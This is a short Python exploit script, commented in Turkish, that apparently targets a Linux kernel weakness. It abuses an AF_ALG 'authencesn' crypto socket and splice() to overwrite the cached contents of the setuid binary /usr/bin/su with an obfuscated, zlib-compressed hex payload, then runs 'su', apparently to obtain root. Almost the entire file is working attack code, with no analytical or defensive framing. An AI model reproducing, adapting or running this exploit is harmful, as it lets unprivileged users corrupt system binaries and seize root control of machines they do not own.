#!/usr/bin/env python3
import os as g, zlib, socket as s, ctypes

# libc'yi yükleyip splice'ı tanımlıyoruz
libc = ctypes.CDLL("libc.so.6")
_splice = libc.splice
_splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_longlong), ctypes.c_int, ctypes.POINTER(ctypes.c_longlong), ctypes.c_size_t, ctypes.c_uint]
_splice.restype = ctypes.c_ssize_t

def splice(fd_in, fd_out, length, offset_src=None):
    off_in = ctypes.c_longlong(offset_src) if offset_src is not None else None
    return _splice(fd_in, off_in, fd_out, None, length, 0)

def d(x): return bytes.fromhex(x)

def c(f, t, c_val):
    a = s.socket(38, 5, 0)
    # AF_ALG = 38
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279  # SOL_ALG
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg([b"A" * 4 + c_val], [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)], 32768)
    r, w = g.pipe()
    
    # Buradaki n(f, w, o, offset_src=0) kısmını yeni splice ile değiştiriyoruz
    splice(f, w, o, offset_src=0)
    splice(r, u.fileno(), o)
    
    try:
        u.recv(8 + t)
    except:
        pass

# Dosyayı aç ve işle
f = g.open("/usr/bin/su", 0)
i = 0
e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))

while i < len(e):
    c(f, i, e[i:i+4])
    i += 4

g.system("su")
